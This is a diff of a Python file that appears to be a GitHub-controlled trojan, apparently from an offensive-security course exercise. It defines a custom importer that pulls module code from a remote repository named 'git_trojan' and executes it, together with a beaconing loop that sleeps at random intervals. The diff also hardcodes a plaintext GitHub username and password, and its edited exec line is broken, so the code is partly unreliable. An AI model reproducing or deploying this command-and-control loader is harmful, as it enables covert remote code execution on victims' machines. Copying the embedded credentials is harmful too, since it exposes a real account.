@@ -1,3 +1,4 @@
+#-*- coding:utf8 -*-
 import json
 import base64
 import sys
@@ -42,8 +43,7 @@ class GitImporter(object):
 
         module = imp.new_module(name)
 
-        exec
-        self.current_module_code in module.__dict__
+        exec(self.current_module_code in module.__dict__)
 
         sys.modules[name] = module
 
@@ -52,7 +52,7 @@ class GitImporter(object):
 
 def connect_to_github():
     gh = login(username="dumbwhale", password="xing0718!")
-    repo = gh.repository("dumbwhale", "chapter7")
+    repo = gh.repository("dumbwhale", "git_trojan")
     branch = repo.branch("master")
 
     return gh, repo, branch
@@ -126,3 +126,6 @@ while True:
             time.sleep(random.randint(1, 10))
 
     time.sleep(random.randint(1000, 10000))
+    
+if __name__ == '__main__':
+       get_file_contents()
